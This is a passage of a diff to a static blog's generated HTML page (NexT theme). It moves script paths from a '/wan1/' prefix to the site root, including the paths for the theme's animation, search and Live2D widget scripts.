+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -574,48 +574,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
